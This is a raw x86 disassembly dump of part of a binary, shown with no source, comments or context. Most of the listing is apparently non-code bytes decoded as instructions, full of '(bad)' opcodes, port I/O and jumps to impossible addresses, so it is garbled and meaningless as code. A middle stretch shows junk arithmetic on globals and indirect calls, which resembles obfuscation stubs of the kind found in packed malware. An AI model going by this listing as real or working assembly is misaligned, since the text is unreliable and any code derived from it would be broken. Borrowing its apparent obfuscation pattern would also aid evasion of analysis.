  4175e1:	ins    BYTE PTR es:[edi],dx
  4175e2:	lds    edi,FWORD PTR [esi]
  4175e4:	or     DWORD PTR [edi+0x20e6ed8e],ecx
  4175ea:	(bad)  
  4175eb:	sar    BYTE PTR [ebx+0xe70e164],1
  4175f1:	lahf   
  4175f2:	jne    0x41761b
  4175f4:	aaa    
  4175f5:	or     eax,DWORD PTR [edi]
  4175f7:	dec    ecx
  4175f8:	out    0xd5,eax
  4175fa:	call   0x9acfd5a2
  4175ff:	addr16 xchg ecx,eax
  417601:	retf   
  417602:	int    0x89
  417604:	sbb    DWORD PTR [ecx],ebx
  417606:	fisub  WORD PTR [ecx+0x2d]
  417609:	inc    esi
  41760a:	ins    BYTE PTR es:[edi],dx
  41760b:	and    al,0x85
  41760d:	and    eax,ebx
  41760f:	and    al,0x8b
  417611:	ins    BYTE PTR es:[edi],dx
  417612:	lods   al,BYTE PTR ds:[esi]
  417613:	push   0x71
  417615:	loopne 0x4175a9
  417617:	js     0x41763f
  417619:	cmp    esi,DWORD PTR [esp+eiz*2-0x63a4916b]
  417620:	scas   al,BYTE PTR es:[edi]
  417621:	cmp    al,0x81
  417623:	sbb    al,0xb9
  417625:	fidiv  WORD PTR [ecx+0x45]
  417628:	mov    gs,WORD PTR [esi-0xb]
  41762b:	pop    edx
  41762c:	pop    esp
  41762d:	dec    eax
  41762e:	mov    ecx,0xfc030c92
  417633:	lods   al,BYTE PTR ds:[esi]
  417634:	(bad)  
  417635:	ror    DWORD PTR [eax+0xa],1
  417638:	lds    eax,FWORD PTR ds:0x510a4dd6
  41763e:	inc    eax
  41763f:	imul   BYTE PTR [eax-0x5f710b93]
  417645:	pushf  
  417646:	inc    eax
  417647:	repz adc BYTE PTR [eax-0x10],dh
  41764b:	std    
  41764c:	imul   edi,DWORD PTR [ecx+0x4d],0x7d
  417650:	jge    0x417637
  417652:	ja     0x4176d0
  417654:	add    DWORD PTR [ebp+ebp*1-0x370b221],ebx
  41765b:	int3   
  41765c:	push   eax
  41765d:	imul   esp,DWORD PTR [ebx+0x12],0xffffffea
  417661:	je     0x4176c1
  417663:	sub    esp,DWORD PTR [eax]
  417665:	test   DWORD PTR [ebx],ebx
  417667:	je     0x260ed4da
  41766d:	neg    BYTE PTR [edi-0x2032d48d]
  417673:	or     al,0xa9
  417675:	arpl   cx,di
  417677:	lods   al,BYTE PTR ds:[esi]
  417678:	std    
  417679:	mov    ecx,0x97c84ccc
  41767e:	jmp    0x400b0b2c
  417683:	add    BYTE PTR [edx+ecx*1-0x4],bh
  417687:	fwait
  417688:	mov    BYTE PTR [edi-0x73],dl
  41768b:	sbb    BYTE PTR [ebx+0x1a],al
  41768e:	pop    ds
  41768f:	jns    0x41769b
  417691:	gs mov ah,0x42
  417694:	int3   
  417695:	mov    ebp,0xc27d45f
  41769a:	mov    ebx,DWORD PTR ds:0x867199e1
  4176a0:	arpl   WORD PTR [esi],ax
  4176a2:	dec    ecx
  4176a3:	call   0x6b59383e
  4176a8:	daa    
  4176a9:	xlat   BYTE PTR ds:[ebx]
  4176aa:	retf   0x5da6
  4176ad:	sbb    eax,0x5b984f30
  4176b2:	jmp    0x417673
  4176b4:	imul   edi,DWORD PTR [esi],0x2458ac85
  4176ba:	and    ebx,edx
  4176bc:	jle    0x41764c
  4176be:	xchg   ecx,eax
  4176bf:	shl    cl,1
  4176c1:	push   esp
  4176c2:	xchg   BYTE PTR [edx+0x18],cl
  4176c5:	xchg   edi,eax
  4176c6:	dec    edi
  4176c7:	pop    ds
  4176c8:	lods   al,BYTE PTR ds:[esi]
  4176c9:	jmp    0x3f17:0x1363d971
  4176d0:	mov    cl,0x5a
  4176d2:	aad    0xe3
  4176d4:	sbb    DWORD PTR [esi+0x622fb5e9],esp
  4176da:	mov    ecx,0x3fca4fe3
  4176df:	jnp    0x417667
  4176e1:	sbb    al,0xbc
  4176e3:	stc    
  4176e4:	sbb    eax,0xf4b369a
  4176e9:	xchg   esi,eax
  4176ea:	mov    ds:0x4402947,eax
  4176ef:	jg     0x4176a6
  4176f1:	fiadd  DWORD PTR es:[ecx]
  4176f4:	out    0xe3,al
  4176f6:	call   0xc2ae:0xa93bc796
  4176fd:	loop   0x4176e3
  4176ff:	mov    al,ds:0x5e8f07b6
  417704:	or     ah,ch
  417706:	push   0x5e4ffa4
  41770b:	push   cs
  41770c:	push   fs
  41770e:	mov    esi,0xad0d116a
  417713:	popa   
  417714:	cmp    ebp,DWORD PTR [ecx+0xab19027]
  41771a:	mov    bh,0xd
  41771c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41771d:	jecxz  0x4176f4
  41771f:	lea    edi,[ecx+edi*4-0x48497810]
  417726:	scas   eax,DWORD PTR es:[edi]
  417727:	sub    bh,BYTE PTR [edx]
  417729:	xor    DWORD PTR [edi-0x150f62c4],0xffffffea
  417730:	lods   al,BYTE PTR ds:[esi]
  417731:	dec    ebx
  417732:	mov    ss,WORD PTR [edi]
  417734:	xchg   ebp,eax
  417735:	ror    esp,1
  417737:	xchg   BYTE PTR [edi-0x76],ah
  41773a:	loop   0x4177b5
  41773c:	adc    BYTE PTR [edx-0x22b75ac3],cl
  417742:	dec    eax
  417743:	push   eax
  417744:	xchg   edx,eax
  417745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417746:	fcomp  st(5)
  417748:	cmp    DWORD PTR [edx+eax*2-0x15121e5f],eax
  41774f:	mov    cl,0xd7
  417751:	add    cl,BYTE PTR [ebp-0x6188b5f6]
  417757:	mov    ah,0x0
  417759:	sub    edi,DWORD PTR [ecx-0xc]
  41775c:	inc    esi
  41775d:	adc    eax,DWORD PTR [edx]
  41775f:	xor    eax,0xb3fa8e
  417764:	xchg   ebp,eax
  417765:	cmp    esi,esi
  417767:	into   
  417768:	add    al,0x89
  41776a:	outs   dx,BYTE PTR ds:[esi]
  41776b:	mov    esi,0x67ed25be
  417770:	jo     0x4177c7
  417772:	sub    dh,ch
  417774:	xchg   edx,eax
  417775:	fldenv [edi+esi*1]
  417778:	dec    edi
  417779:	arpl   WORD PTR [ebp+0x5a],si
  41777c:	int    0xee
  41777e:	push   es
  41777f:	sbb    ah,BYTE PTR [edx-0x4867de93]
  417785:	lock jb 0x417786
  417788:	push   0xffffffde
  41778a:	add    eax,0x8dab0e3e
  41778f:	adc    al,0x98
  417791:	(bad)  
  417792:	dec    edi
  417793:	mov    DWORD PTR [edx+0x1d],ebx
  417796:	pop    eax
  417797:	adc    ecx,esi
  417799:	imul   ecx
  41779b:	inc    ebx
  41779c:	ror    DWORD PTR [esi],0x81
  41779f:	ins    DWORD PTR es:[edi],dx
  4177a0:	jl     0x417802
  4177a2:	push   edi
  4177a3:	pop    ebx
  4177a4:	(bad)  
  4177a6:	mov    esp,0x33303d77
  4177ab:	call   0x2862:0xa3b17d06
  4177b2:	neg    BYTE PTR [ecx-0x6461e23b]
  4177b8:	sbb    BYTE PTR [eax+ebx*4],bl
  4177bb:	mov    dh,0x3e
  4177bd:	mov    eax,0x1a050c74
  4177c2:	xchg   BYTE PTR [eax],bl
  4177c4:	imul   edx,ebx,0x2ed8041d
  4177ca:	outs   dx,DWORD PTR ds:[esi]
  4177cb:	in     al,0x8e
  4177cd:	fisttp WORD PTR [edx]
  4177cf:	inc    esp
  4177d0:	dec    esp
  4177d1:	daa    
  4177d2:	(bad)  
  4177d3:	stc    
  4177d4:	int3   
  4177d5:	fidivr DWORD PTR [eax]
  4177d7:	aas    
  4177d8:	xchg   ebp,eax
  4177d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177da:	das    
  4177db:	and    al,0x63
  4177dd:	mov    edi,0xb7291c07
  4177e3:	(bad)  
  4177e4:	adc    al,BYTE PTR [esi-0xa]
  4177e7:	adc    BYTE PTR [edi+0x7628276a],bh
  4177ed:	inc    ebx
  4177ee:	arpl   WORD PTR [ebp+0x3508c28d],di
  4177f4:	mov    dh,0x55
  4177f6:	cdq    
  4177f7:	or     al,0xb6
  4177f9:	js     0x417783
  4177fb:	mov    WORD PTR [edx],cs
  4177fd:	test   al,0x66
  4177ff:	or     eax,0xf1ae0e52
  417804:	push   0xaccf76a6
  417809:	or     al,0x42
  41780b:	lock fistp DWORD PTR [edi-0x3080f967]
  417812:	ja     0x4177d4
  417814:	add    BYTE PTR [ebp-0x30],0x4a
  417818:	outs   dx,BYTE PTR ds:[esi]
  417819:	out    dx,eax
  41781a:	shl    DWORD PTR [eax+0x34],1
  41781d:	adc    edx,eax
  41781f:	mov    cl,0x2d
  417821:	push   esp
  417822:	hlt    
  417823:	out    dx,al
  417824:	imul   esp,DWORD PTR [edi-0x71],0x7
  417828:	cdq    
  417829:	and    ebp,DWORD PTR [eax-0x55]
  41782c:	push   edx
  41782d:	rol    BYTE PTR [edx-0x7a9d9e0d],0x16
  417834:	lods   al,BYTE PTR ds:[esi]
  417835:	(bad)  
  417836:	pop    edx
  417837:	in     al,dx
  417838:	inc    esp
  417839:	stc    
  41783a:	es out dx,al
  41783c:	jge    0x41789e
  41783e:	sub    al,0x57
  417840:	pop    ebp
  417841:	pop    ds
  417842:	les    ebx,FWORD PTR [ebx-0xb8c609e]
  417848:	lods   al,BYTE PTR ds:[esi]
  417849:	and    edi,ebp
  41784b:	mov    esp,DWORD PTR [edx+0x1b]
  41784e:	push   edx
  41784f:	stos   BYTE PTR es:[edi],al
  417850:	dec    eax
  417851:	cdq    
  417852:	inc    ecx
  417853:	jo     0x4178c1
  417855:	aad    0x68
  417857:	xchg   esp,eax
  417858:	outs   dx,BYTE PTR ds:[esi]
  417859:	jns    0x41780c
  41785b:	sub    esi,eax
  41785d:	lods   eax,DWORD PTR ds:[esi]
  41785e:	mov    eax,ds:0xd50eaf9a
  417863:	retf   
  417864:	icebp  
  417865:	push   edi
  417866:	in     eax,dx
  417867:	xchg   BYTE PTR [edx+0x29b03fc0],ch
  41786d:	inc    eax
  41786e:	cmp    ebp,ebx
  417870:	jbe    0x417871
  417872:	add    ecx,eax
  417874:	aaa    
  417875:	push   cs
  417876:	xchg   al,dl
  417878:	xor    BYTE PTR [eax+0x11],bl
  41787b:	cmp    dl,ah
  41787d:	imul   ebp,DWORD PTR [ebp+0x2a],0xaa31d45c
  417884:	push   0xfffffff6
  417886:	(bad)  
  417887:	bound  ebp,QWORD PTR [edi+edx*8]
  41788a:	imul   edx,DWORD PTR [ebx+0x46],0x7c7f7d6e
  417891:	and    al,0xca
  417893:	or     ebx,edi
  417895:	out    0xda,eax
  417897:	ret    0x4bb0
  41789a:	sub    al,0xd4
  41789c:	loop   0x417839
  41789e:	retf   
  41789f:	cdq    
  4178a0:	inc    ebx
  4178a1:	inc    ebx
  4178a2:	icebp  
  4178a3:	adc    BYTE PTR [edx],al
  4178a5:	fist   DWORD PTR [ebx+0x77df6538]
  4178ab:	pushf  
  4178ac:	mov    dh,0x75
  4178ae:	or     ebx,DWORD PTR [ecx-0x2fe2876c]
  4178b4:	pop    edx
  4178b5:	cwde   
  4178b6:	rcr    BYTE PTR [edx+0x3158c35b],1
  4178bc:	fs repnz pop ss
  4178bf:	dec    ecx
  4178c0:	xor    DWORD PTR [esi-0xa],edi
  4178c3:	cmp    eax,0x537e9a96
  4178c8:	mov    esp,0x68c5bd20
  4178cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178ce:	and    al,0x8
  4178d0:	cwde   
  4178d1:	sbb    al,0x4
  4178d3:	xchg   edi,eax
  4178d4:	cmp    eax,0x3c33ddf1
  4178d9:	sbb    eax,0x8b0eb61c
  4178de:	dec    eax
  4178df:	xor    eax,0xbfaf9860
  4178e4:	aam    0x4b
  4178e6:	stos   BYTE PTR es:[edi],al
  4178e7:	jo     0x417894
  4178e9:	repnz mov ah,BYTE PTR [edi-0x57]
  4178ed:	ins    BYTE PTR es:[edi],dx
  4178ee:	push   0x0
  4178f0:	and    DWORD PTR ds:0x4282a7,0x6fb6
  4178fa:	push   DWORD PTR [ecx]
  4178fc:	or     DWORD PTR ds:0x428247,0x652f
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42825f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x428247,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x4282e7
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x4282af,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42825f,0x428267
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x428323,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x42827f,0x4281ab
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x42816b,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x42826f,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x4282ab,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x4283b7
  4179bb:	add    DWORD PTR ds:0x42817b,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x4282a3,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x428163,0x42837f
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x42817b,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x428267
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x428307,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x428283,0x0
  417a53:	mov    DWORD PTR ds:0x4282ff,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x428277,0x44f5
  417a72:	cmp    DWORD PTR ds:0x428283,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428df4
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428257,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x4282e3
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x42819b,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x4281ab,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x42816f
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [eax+ebx*4-0x5155184e],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1+0x77c01818],bh
  417b02:	pop    ecx
  417b03:	sub    DWORD PTR [ecx+esi*8],esi
  417b06:	ins    DWORD PTR es:[edi],dx
  417b07:	adc    ebx,DWORD PTR [eax+0x25]
  417b0a:	dec    esp
  417b0b:	cmp    edi,eax
  417b0d:	and    al,0x79
  417b0f:	mov    al,0x83
  417b11:	ds xor al,0x80
  417b14:	loop   0x417ab1
  417b16:	aad    0x16
  417b18:	retf   
  417b19:	cwde   
  417b1a:	ror    BYTE PTR [edi+esi*4+0xc],1
  417b1e:	sub    eax,0xe9ef6f33
  417b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b24:	or     dh,BYTE PTR [edi+0x1e]
  417b27:	std    
  417b28:	mov    esp,0x17a77e96
  417b2d:	sahf   
  417b2e:	lea    edx,[ebx+0x16]
  417b31:	push   0x7cf8f214
  417b36:	dec    esp
  417b37:	or     BYTE PTR [edx+eax*4-0xa1a832a],ah
  417b3e:	loope  0x417ad2
  417b40:	jne    0x417b03
  417b42:	adc    edi,ecx
  417b44:	and    DWORD PTR [ebx+0x6f],ebx
  417b47:	inc    edx
  417b48:	mov    ebp,DWORD PTR [ebx+0x7b883861]
  417b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b4f:	inc    edx
  417b50:	jns    0x417b6a
  417b52:	out    dx,al
  417b53:	lods   eax,DWORD PTR ds:[esi]
  417b54:	push   cs
  417b55:	mov    ds,WORD PTR [ebp+0x36dd854f]
  417b5b:	(bad)  
  417b5c:	jp     0x417b17
  417b5e:	or     DWORD PTR [ebx+0x23c49ad9],esi
  417b64:	imul   DWORD PTR [ecx]
  417b66:	iret   
  417b67:	sbb    BYTE PTR [esi-0x78],cl
  417b6a:	xor    eax,0x83ae5798
  417b6f:	ss rcl dh,1
  417b72:	xlat   BYTE PTR ds:[ebx]
  417b73:	movntq QWORD PTR [edx-0x7a],mm3
  417b77:	or     al,0xbd
  417b79:	std    
  417b7a:	or     al,0x8b
  417b7c:	push   edx
  417b7d:	ret    0x2bc6
  417b80:	sub    al,0x94
  417b82:	outs   dx,BYTE PTR ds:[esi]
  417b83:	js     0x417bb2
  417b85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b86:	xchg   ebp,eax
  417b87:	mov    eax,ds:0x6c105ca5
  417b8c:	and    al,0x1e
  417b8e:	loopne 0x417bdc
  417b90:	lds    di,DWORD PTR es:[edx]
  417b94:	gs inc esp
  417b96:	ss scas al,BYTE PTR es:[edi]
  417b98:	xchg   edi,eax
  417b99:	adc    edx,DWORD PTR [eax]
  417b9b:	push   edi
  417b9c:	fst    QWORD PTR [ecx+edx*1+0x315edf0d]
  417ba3:	mov    edx,0x68bce212
  417ba8:	(bad)  
  417ba9:	sub    al,0x10
  417bab:	sub    BYTE PTR [edi+0x6c],ch
  417bae:	retf   
  417baf:	test   DWORD PTR [esp+esi*1+0x29],esp
  417bb3:	dec    esi
  417bb4:	lds    esi,FWORD PTR [ebp+ebx*4+0x27]
  417bb8:	push   0x1e
  417bba:	mov    WORD PTR [ebp+0x651f8d31],?
  417bc0:	jmp    FWORD PTR [esp+eax*4+0x6f]
  417bc4:	outs   dx,BYTE PTR ds:[esi]
  417bc5:	dec    edi
  417bc6:	es test edx,edx
  417bc9:	xlat   BYTE PTR ds:[ebx]
  417bca:	and    BYTE PTR [edx-0x4e],ch
  417bcd:	dec    ecx
  417bce:	jl     0x417b75
  417bd0:	jg     0x417c41
  417bd2:	cmp    al,BYTE PTR [esi-0x6ccf20f5]
  417bd8:	dec    edx
  417bd9:	mov    dl,0x3e
  417bdb:	mov    ebx,0xdb821f9d
  417be0:	ret    0x674e
  417be3:	in     al,dx
  417be4:	sahf   
  417be5:	(bad)  
  417be6:	push   ds
  417be7:	push   edx
  417be8:	sbb    ecx,edx
  417bea:	es push 0xf80dc2a2
  417bf0:	lods   al,BYTE PTR ds:[esi]
  417bf1:	daa    
  417bf2:	add    al,0xb1
  417bf4:	push   0x52abaccb
  417bf9:	daa    
  417bfa:	loope  0x417c25
  417bfc:	leave  
  417bfd:	mov    ch,0x49
  417bff:	repz mov dh,0xce
  417c02:	mov    esp,edi
  417c04:	jno    0x417c3f
  417c06:	mov    ah,0x84
  417c08:	jo     0x417c5d
  417c0a:	int3   
  417c0b:	nop
  417c0c:	aaa    
  417c0d:	call   0x53486339
  417c12:	call   0x5a1:0x49885704
  417c19:	sub    DWORD PTR [ecx+0x481b0407],esp
  417c1f:	js     0x417c50
  417c21:	and    DWORD PTR [ecx+0x64],edi
  417c24:	out    0x7b,al
  417c26:	js     0x417bb3
  417c28:	fs rol cl,cl
  417c2b:	inc    esi
  417c2c:	outs   dx,DWORD PTR ds:[esi]
  417c2d:	in     al,0x94
  417c2f:	ins    BYTE PTR es:[edi],dx
  417c30:	mov    cl,0xa2
  417c32:	mov    dl,0xd0
  417c34:	adc    al,BYTE PTR [esp+edx*2-0x6609e54e]
  417c3b:	into   
  417c3c:	jmp    0x417c0e
  417c3e:	ds mov ebx,0xdc50220b
  417c44:	inc    ecx
  417c45:	jne    0x417be1
  417c47:	or     BYTE PTR es:[edx],dl
  417c4a:	mov    bl,0x2c
  417c4c:	fdiv   QWORD PTR [eax+0x4a]
  417c4f:	jbe    0x417c12
  417c51:	jle    0x417bef
  417c53:	push   esp
  417c54:	shr    ebp,cl
  417c56:	(bad)  
  417c57:	xor    al,0xf4
  417c59:	outs   dx,DWORD PTR ds:[esi]
  417c5a:	sar    BYTE PTR [esi],cl
  417c5c:	rol    BYTE PTR [ecx-0x23181025],1
  417c62:	sti    
  417c63:	cmp    edi,esp
  417c65:	daa    
  417c66:	sub    bl,bl
  417c68:	loopne 0x417bf2
  417c6a:	xchg   ecx,eax
  417c6b:	icebp  
  417c6c:	and    ebp,esi
  417c6e:	fdivp  st(1),st
  417c70:	adc    BYTE PTR [ebp-0x4],bh
  417c73:	cmp    al,0x82
  417c75:	ss xchg ah,cl
  417c78:	(bad)  
  417c79:	pop    edx
  417c7a:	cli    
  417c7b:	inc    edx
  417c7c:	jmp    0x417c72
  417c7e:	in     eax,0x2c
  417c80:	mov    cl,0x9a
  417c82:	gs sahf 
  417c84:	mov    eax,ds:0x11744675
  417c89:	cmp    eax,0x70f19e76
  417c8e:	(bad)  
  417c8f:	jge    0x417c82
  417c91:	(bad)  
  417c92:	and    al,al
  417c94:	lock xchg esi,eax
  417c96:	and    DWORD PTR [edi],edi
  417c98:	ss (bad) 
  417c9a:	stos   BYTE PTR es:[edi],al
  417c9b:	mov    esp,0xc1a7f1dd
  417ca0:	add    esp,esp
  417ca2:	dec    DWORD PTR [ecx]
  417ca4:	sbb    DWORD PTR [esi+edi*4],eax
  417ca7:	sbb    al,0x56
  417ca9:	xor    ebp,DWORD PTR [edx]
  417cab:	pop    ebx
  417cac:	inc    edx
  417cad:	pop    ecx
  417cae:	fimul  WORD PTR [esi]
  417cb0:	aas    
  417cb1:	push   0x37
  417cb3:	popf   
  417cb4:	push   cs
  417cb5:	clc    
  417cb6:	jae    0x417cf2
  417cb8:	addr16 jp 0x417c76
  417cbb:	cmp    DWORD PTR [esi+0x7566b039],edx
  417cc1:	sbb    DWORD PTR [eax+0x6e78dcce],0x1f
  417cc8:	mov    bh,0xf6
  417cca:	mov    al,ds:0xabc4adb0
  417ccf:	jnp    0x417c77
  417cd1:	pop    ecx
  417cd2:	ins    DWORD PTR es:[edi],dx
  417cd3:	mov    ch,ch
  417cd5:	repz xor cl,BYTE PTR [ebx+ebx*8-0x26]
  417cda:	test   BYTE PTR [ecx+ebp*2-0x5a],bh
  417cde:	and    DWORD PTR [esi+0x5b],edi
  417ce1:	cs push ds
  417ce3:	ficom  DWORD PTR [esi-0x479222a7]
  417ce9:	ins    BYTE PTR es:[edi],dx
  417cea:	xchg   edx,eax
  417ceb:	inc    esi
  417cec:	xor    DWORD PTR [ecx],esi
  417cee:	out    dx,eax
  417cef:	ret    
  417cf0:	lock out 0xbd,al
  417cf3:	add    ecx,ecx
  417cf5:	mov    dl,0x75
  417cf7:	and    dl,dh
  417cf9:	xchg   edx,eax
  417cfa:	jae    0x417ca9
  417cfc:	cli    
  417cfd:	jl     0x417c86
  417cff:	mov    dh,0x88
  417d01:	cmp    al,0xc0
  417d03:	dec    DWORD PTR [edx]
  417d05:	out    dx,eax
  417d06:	sbb    dl,BYTE PTR [edx+0x1f]
  417d09:	popf   
  417d0a:	in     eax,0x32
  417d0c:	lock imul ecx,DWORD PTR [edi],0x7486e8cc
  417d13:	enter  0x8c8d,0xb8
  417d17:	(bad)  
  417d18:	xchg   esp,eax
  417d19:	xchg   edi,eax
  417d1a:	in     eax,dx
  417d1b:	cmp    eax,0xcd655efd
  417d20:	inc    ecx
  417d21:	call   0xa3a7a647
  417d26:	pop    edx
  417d27:	test   eax,0x2f912f35
  417d2c:	pop    ss
  417d2d:	or     BYTE PTR [eax+0x73645b15],0xf9
  417d34:	out    dx,eax
  417d35:	mov    BYTE PTR [ebp+edx*8+0x513d17f1],dl
  417d3c:	lds    ecx,FWORD PTR [edi+0x7d2a0093]
  417d42:	in     al,0xf
  417d44:	push   esp
  417d45:	loope  0x417da8
  417d47:	or     eax,0x40b4d80
  417d4c:	das    
  417d4d:	sahf   
  417d4e:	mov    bl,0xa2
  417d50:	sar    DWORD PTR [esi-0x56448ac1],0xce
  417d57:	sbb    BYTE PTR [eax-0x714fac7],bh
  417d5d:	in     al,0x66
  417d5f:	add    BYTE PTR [edx],bl
  417d61:	cwde   
  417d62:	add    ecx,DWORD PTR [esi-0x1f3e56a7]
  417d68:	xor    al,0x64
  417d6a:	daa    
  417d6b:	pop    ss
  417d6c:	push   edi
  417d6d:	cmovns edx,DWORD PTR [di]
  417d71:	or     eax,0x2a65f64b
  417d76:	or     bl,ch
  417d78:	push   cs
  417d79:	test   cl,cl
  417d7b:	cmp    dl,BYTE PTR [ebp+0x11]
  417d7e:	inc    eax
  417d7f:	mov    dl,0x22
  417d81:	lods   al,BYTE PTR ds:[esi]
  417d82:	xchg   ebx,eax
  417d83:	push   esi
  417d84:	mov    DWORD PTR [ecx-0x7787613d],ebp
  417d8a:	fld1   
  417d8c:	ss inc esp
  417d8e:	jmp    0x9fccadd6
  417d93:	rol    BYTE PTR [esi+0x43],cl
  417d96:	out    0x91,eax
  417d98:	lea    esi,[ecx]
  417d9a:	jmp    FWORD PTR [esi]
  417d9c:	cwde   
  417d9d:	rcl    dl,0xa2
  417da0:	mov    dh,0x1f
  417da2:	xchg   edi,eax
  417da3:	sub    BYTE PTR [eax-0x6f],al
  417da6:	adc    BYTE PTR [ebp-0x6dcc6248],bl
  417dac:	mov    al,ds:0x5dee5c49
  417db1:	out    dx,al
  417db2:	loopne 0x417df6
  417db4:	test   bh,dh
  417db6:	jo     0x417d60
  417db8:	sub    al,0xfd
  417dba:	sbb    BYTE PTR [eax+0x1692b062],bh
  417dc0:	jne    0x417e27
  417dc2:	(bad)  
  417dc4:	or     ebp,ebp
  417dc6:	test   BYTE PTR [esi+ecx*1],cl
  417dc9:	sahf   
  417dca:	xchg   esi,eax
  417dcb:	lods   eax,DWORD PTR ds:[esi]
  417dcc:	sti    
  417dcd:	not    BYTE PTR [ebp-0x78]
  417dd0:	xor    esp,DWORD PTR [edx]
  417dd2:	pop    ebp
  417dd3:	sub    DWORD PTR [edx],ebx
  417dd5:	or     esi,DWORD PTR [edi]
  417dd7:	and    cl,al
  417dd9:	imul   esi,DWORD PTR gs:[edi],0x6b8e6a6
  417de0:	scas   al,BYTE PTR es:[edi]
  417de1:	add    DWORD PTR [ebp+0x342daa5d],edi
  417de7:	adc    eax,0x8ab1d86a
  417dec:	and    BYTE PTR [edx+ebx*1+0x757d1e5e],bh
  417df3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417df4:	ja     0x417df0
  417df6:	pop    ss
  417df7:	loope  0x417d98
  417df9:	inc    eax
  417dfa:	add    dl,BYTE PTR es:[eax]
  417dfd:	mov    bl,dh
  417dff:	mov    eax,ds:0xc01e73f0
  417e04:	ret    0x4dce
  417e07:	es adc al,0xe2
  417e0a:	adc    al,0x8b
  417e0c:	lahf   
  417e0d:	shl    DWORD PTR [esi],cl
  417e0f:	loop   0x417e86
  417e11:	data16 jo 0x417e46
  417e14:	cmp    al,0xdb
  417e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e17:	or     eax,0x86fe7a9a
  417e1c:	jns    0x417e68
  417e1e:	adc    eax,0x871b5672
  417e23:	inc    esp
  417e24:	sub    bh,BYTE PTR [ebp-0x4a]
  417e27:	cwde   
  417e28:	rol    DWORD PTR [ecx],cl
  417e2a:	xchg   esi,eax
  417e2b:	aas    
  417e2c:	and    edx,esp
  417e2e:	mov    cl,0x2
  417e30:	jmp    0xd4552264
  417e35:	dec    DWORD PTR [ebx+edi*1+0x26d8475]
  417e3c:	sbb    eax,0xce25c32c
  417e41:	lea    ebx,[eax+eax*1-0x712e8486]
  417e48:	or     DWORD PTR [eax+0x66846970],ebp
  417e4e:	mov    cl,0x48
  417e50:	shr    DWORD PTR [edx+0x0],cl
  417e53:	in     eax,dx
  417e54:	fcomi  st,st(7)
  417e56:	push   ebx
  417e57:	jecxz  0x417e42
  417e59:	cmp    edi,edx
  417e5b:	cmp    esi,esi
  417e5d:	pop    ebp
